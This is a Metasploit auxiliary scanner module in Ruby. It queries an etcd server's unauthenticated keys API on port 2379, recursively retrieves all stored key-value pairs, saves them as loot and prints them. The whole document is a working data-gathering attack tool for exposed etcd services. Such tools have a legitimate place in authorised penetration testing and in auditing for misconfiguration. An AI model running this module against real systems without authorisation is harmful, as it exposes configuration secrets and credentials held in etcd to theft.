##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Etcd Keys API Information Gathering',
      'Description' => %q{
        This module queries the etcd API to recursively retrieve all of the stored
        key value pairs.  Etcd by default does not utilize authentication.
      },
      'References'  => [
          ['URL', 'https://elweb.co/the-security-footgun-in-etcd']
        ],
      'Author'      => [
          'Giovanni Collazo', # discovery
          'h00die' # msf module
        ],
      'License'     => MSF_LICENSE
    )

    register_options([
      Opt::RPORT(2379),
      OptString.new('TARGETURI', [ true,  'URI of the vulnerable service', '/v2/keys/?recursive=true'])
    ])
  end

  def run_host(target_host)
    path = normalize_uri(target_uri.to_s)

    vprint_status("#{peer} - Collecting data through #{path}...")
    res = send_request_raw({
      'uri'    => path,
      'method' => 'GET'
    })

    # do a read the json if we got a good request back
    if res and res.code == 200
      begin
        response = res.get_json_document
        store_loot('etcd.data', 'text/plain', rhost, response, 'etcd.keys', 'etcd keys')
        report_service({
          :host => rhost,
          :port => rport,
          :name => 'etcd',
          :info => "Unauthenticated access through #{ssl ? 'https' : 'http'}://#{peer}#{path}"
        })
      rescue JSON::ParserError => e
        print_error("Failed to read JSON: #{e.class} - #{e.message}}")
        return
      end
      print_good(JSON.pretty_generate(response))
    end
  end
end
